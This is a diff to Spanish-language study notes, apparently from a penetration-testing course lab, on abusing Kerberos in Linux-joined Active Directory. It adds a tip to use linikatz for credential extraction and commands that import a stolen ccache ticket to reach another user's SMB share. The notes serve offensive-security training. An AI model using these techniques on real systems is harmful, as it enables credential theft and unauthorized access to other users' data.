@@ -27,6 +27,8 @@
 - `realm list` Lista información del AD
 - `klist` Lista información de kerberos
 
+## Recomendado utilizar linikatz para extraer toda esta info
+
 ### Impersonando un usuario con keytab
 
 ```
@@ -67,3 +69,11 @@ david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
 ```python3 keytabexcract.py USER.keytab```
 
 - Ya con el NTLM podemos hacer todos los ataque conocidos
+
+## Importing the ccache File into our Current Session
+```
+cp /tmp/krb5cc_647401106_5Eidyq .
+export KRB5CCNAME=/root/krb5cc_647401106_5Eidyq
+klist
+smbclient //DC01/julio -k
+```
